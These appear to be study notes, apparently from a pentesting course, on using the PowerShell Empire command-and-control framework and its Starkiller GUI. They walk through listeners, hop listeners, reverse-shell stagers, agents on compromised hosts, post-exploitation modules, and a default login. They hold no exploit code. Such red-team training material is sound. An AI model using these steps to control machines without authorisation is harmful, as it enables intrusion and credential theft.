# Empire C2

## Overview

Built to attack Windows targets (particularly via .NET).

Empire has several major sections, including:
- **Listeners**: listen for a connection to facilitate further exploration
- **Stagers**: payloads generated by Empire to create a robust reverse shell in conjunction with a listener (delivery mechanism for agents)
- **Agents**: equivalent of a metasploit session (connections to compromised targets and allow an attacker to further interact with the system)
- **Modules**: used in conjunction with agents to perform further exploitation (e.g., work through an existing agent to dump password hashes from server)

Also allows custom **plugins** which extend the functionality of the framework.

## Installation

To install Empire and the Starkiller GUI, run:

```console
$ sudo apt install powershell-empire starkiller
```

To start the Empire server:

```console
$ sudo powershell-empire server
```

It is more common to have an Empire server instance running on a separate C2 server - usually hosted on cloud infrastructure so that pentesters and red teamers can connect to a single central server.

To then start the Empire client:

```console
$ powershell-empire client
```

This will connect to the local server automatically.  If the Empire server is running on another machine, then you would need to either change the connection from the `/usr/share/powershell-empire/empire/client/config.yaml` file or connect manually through the Empire client:

```console
(Empire) > connect HOSTNAME --username=USERNAME --password=PASSWORD
```

## Empire

#### Listeners

Listeners are used to **receive connections** from stagers.  By default this is a `HTTP` listener.  To select a listener, run the `uselistener` command and select an appropriate listener:

```console
(Empire) > uselistener
```

When selected, it will bring up a table of options.  To set an option, use the `set` command:

```console
(Empire) > set OPTION VALUE

# E.g.: set name of listener
(Empire: uselistener/http) > set Name CLIHTTP

# E.g.: set host IP address of listener
(Empire: uselistener/http) > set Host 10.50.73.2

# E.g.: set port number of listener
(Empire: uselistener/http) > set Port 8000
```

When the required options are set, run the `execute` command to start the listener:

```console
(Empire: uselistener/http) > execute
```

To view active listeners, type `listeners`:

```console
(Empire: uselistener/http) > listeners

┌Listeners List┬────────┬───────────────────┬──────────────────────────────────────────┬─────────┐
│ ID │ Name    │ Module │ Listener Category │ Created At                               │ Enabled │
├────┼─────────┼────────┼───────────────────┼──────────────────────────────────────────┼─────────┤
│ 1  │ CLIHTTP │ http   │ client_server     │ 2022-08-30 21:05:46 BST (40 seconds ago) │ True    │
└────┴─────────┴────────┴───────────────────┴──────────────────────────────────────────┴─────────┘
```

To stop a listener, run the `kill LISTENER_NAME` command.

###### Hop Listener

Since Empire agents can't be proxied, we can use a **hop listener** to get an agent back from a target with no outbound access. Rather than opening a port to receive a connection, **hop listeners** create files to be copied across the compromised "jump" server and served from there.  These files contain instructions to connect back to a normal istener.

An example of this is the `http_hop` listener:

```console
(Empire) > uselistener http_hop
```

![[empire_http_hop_listener.png]]

We then need:

- **RedirectListener**: regular listener to forward any received agents to
- **Host**: IP address of compromised server
- **Port**: port which will be used for the server hosting our hop files

Once configured, this will create new files within `/tmp/http_hop` which should be replicated on the compromised server when we serve the files.

#### Stagers

Stagers are Empire's payloads and are used to connect back to waiting listeners, creating an agent when executed.  These can be generated via Empire CLI or Starkiller.  In most cases, a script will be generated which can then be uploaded to the target and executed.

From the main Empire prompt, type:

```console
(Empire) > usestager
```

There are a variety of options, but `multi/handler` is often a good go-to.

As with the listener, we use the `set` command to set options and `execute` to generate a payload.

```console
(Empire: usestager/multi/launcher) > set OPTION

# E.g.: set Listener CLIHTTP
(Empire: usestager/multi/launcher) > set Listener CLIHTTP
[*] Set Listener to CLIHTTP
```

#### Agents

When an agent is obtained on a target machine, you can view it through the `agents` command:

```console
(Empire) > agents
```

To then interact with an agent, use the `interact` command followed by the name of the agent:

```console
(Empire: agents) > interact AGENT_NAME

# E.g.
(Empire: agents) > interact 22HGTDFU
[*] Task 1 results received
root
(Empire: 22HGTDFU) > 
```

We can then use the `help` command to view the full list of available commands:

```console
(Empire: AGENT_NAME) > help 
```

Once we have finished, we use the `back` command to switch contexts back to the agents menu and then subsequently use the `kill` command with the agent's name to kill the agent:

```console
(Empire: AGENT_NAME) > back
(Empire: agents) > kill AGENT_NAME
```

###### Modules

Modules are used to perform various tasks on a compromised target via agents.  Within the context of an agent, type `usemodule` followed by the module you would like to use.  For example, in cases where you do not have elevated access, you may wish to use the `powershell/privesc/sherlock` module:

```console
(Empire: agents) > interact AGENT_NAME
(Empire: AGENT_NAME) > usemodule MODULE_NAME

# E.g.: sherlock module
(Empire: AGENT_NAME) > usemodule powershell/privesc/sherlock
```

As previously, we can use `options` to get information about the module and `execute` to run the module.

## Starkiller

Starkiller is an Electron apps which connects to the REST API exposed by the Empire server.

```console
$ starkiller
```

This will start an instance on `http://localhost:1337` with a default username and password of `empireadmin:password123`.

#### Listeners

Within Starkiller, click "**Create**":

![[starkiller_create.png]]

Select the type:

![[starkiller_listener_type.png]]

Select a name, host IP and port number and then click "**Submit**".

###### Hop Listeners

Similar to the above, go to the "**Listeners**" tab and select `http_hop` as the listener type:

![[starkiller_hop_listener_type.png]]

Again, configure the appropriate parameters before submitting:

![[starkiller_hop_listener_config.png]]

#### Stagers

Firstly, switch to the "**Stagers**" tab and click "**Create**":

![[starkiller_stagers.png]]

Then. select a type of stager:

![[starkiller_stager_type.png]]

Select the appropriate listener, name, and language and then click "**Submit**".

You can then copy your payload to the clipboard:

![[starkiller_stager_copy.png]]

#### Agents

To interact with agents in Starkiller, go to the "**Agents**" tab:

![[starkiller_agents_tab.png]]

As above, we see two agents.  To then interat with one of these agents, either click on its name or click the pop out buttons within the "**Actions**" menu:

![[starkiller_agents_interact.png]]

This will bring up a menu which gives us the ability to execute modules, execute commands on an interactive shell, browse the filesystem, etc.

![[starkiller_agents_interaction.png]]

To delete an agent, we can use either the trashcan as shown in the image above or the kill button with the "**Actions**" menu back in the "**Agents**" tab.

###### Modules

We can also set modules on Starkiller to interact with an agent.  To configure a module, go to the "**Modules**" tab and search for a module:

![[starkiller_modules_tab.png]]

Once a module is selected, select the appropriate agent from the drop-down menu and hit **Submit** to execute

![[starkiller_module_select_agent.png]]

To check the results, navigate to the "**Reporting**" tab and view the output:

![[starkiller_reporting_tab.png]]